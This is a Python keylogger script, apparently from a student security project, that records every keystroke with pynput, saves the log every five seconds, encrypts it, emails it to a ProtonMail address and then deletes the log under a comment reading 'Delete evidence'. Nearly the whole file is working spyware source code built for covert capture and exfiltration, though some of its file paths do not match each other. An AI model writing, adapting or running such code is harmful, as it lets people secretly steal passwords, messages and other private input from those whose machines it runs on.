from pynput import keyboard

import os
import datetime as dt
import threading
import requests

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from cryptography.fernet import Fernet


# Encryption
file_path = "C:\\Users\\richie\\PycharmProjects\\keylogger\\data.txt"
key = Fernet.generate_key()
with open('key.txt', 'wb') as f:
    f.write(key)
fernet = Fernet(key)


# Mailing Information
sender = 'cybersecprojectplus@protonmail.com'
recipient = 'cybersecprojectplus@protonmail.com'
smtp_server = 'smtp.protonmail.com'
smtp_port = 465
username = 'cybersecprojectplus@protonmail.com'
password = os.environ.get("PASSWORD")
subject = 'Logged Information'
body = "Python Mail"

# Empty string for log data
string = ""

def send_email(sender, recipient, subject, body, smtp_server, smtp_port, username, password, filename, attachment):
    # Set up the email message
    msg = MIMEMultipart()
    msg['From'] = sender
    msg['To'] = recipient
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as f:
        attachment_data = f.read()

    attachment = MIMEBase('application', 'octet-stream')
    attachment.set_payload(attachment_data)
    encoders.encode_base64(attachment)
    attachment.add_header('Content-Disposition', f'attachment; filename="{filename}"')
    msg.attach(attachment)


    # Set up the SMTP connection
    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
        server.login(username, password)
        server.sendmail(sender, recipient, msg.as_string())

    print('Email sent successfully.')

def on_press(key):
    global string
    try:
        if key == keyboard.Key.enter:
            string += "\n"
        elif key == keyboard.Key.tab:
            string += "\t"
        elif key == keyboard.Key.space:
            string += " "
        elif key == keyboard.Key.shift:
            pass
        # Skip if there is no data in string variable
        elif key == keyboard.Key.backspace and len(string) == 0:
            pass
        # Keeps logged keys up to date even with backspace
        elif key == keyboard.Key.backspace and len(string) > 0:
            string = string[:-1]
        elif key == keyboard.Key.esc:
            return False
        else:
            string += str(key).replace("'", "")
    except AttributeError:
        print(f'special key {key} pressed')


def on_release(key):
    print(f'{key} released')
    if key == keyboard.Key.esc:
        # Stop listener
        return False


def log_data():
    global string
    threading.Timer(5.0, log_data).start()  # schedule next execution in 5 seconds
    with open('data.txt', 'a') as f:
        timestamp = dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
        f.write(f'{timestamp}: {string}\n')
        string = ""


# Create a thread to periodically write data to the file
log_thread = threading.Thread(target=log_data)
log_thread.start()

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# Read log file first then encrypt
with open('data.txt', 'rb') as f:
    plaintext = f.read()
    encrypted = fernet.encrypt(plaintext)
    encrypted_path = file_path +'.encrypted'

with open('encrypted.txt', 'wb') as f:
    f.write(encrypted)

filename = os.path.basename(encrypted_path)

send_email(
    sender, recipient, subject, body, smtp_server, smtp_port, username, password, filename, encrypted_path
)

# Delete evidence
os.remove(file_path + "\\data.txt")

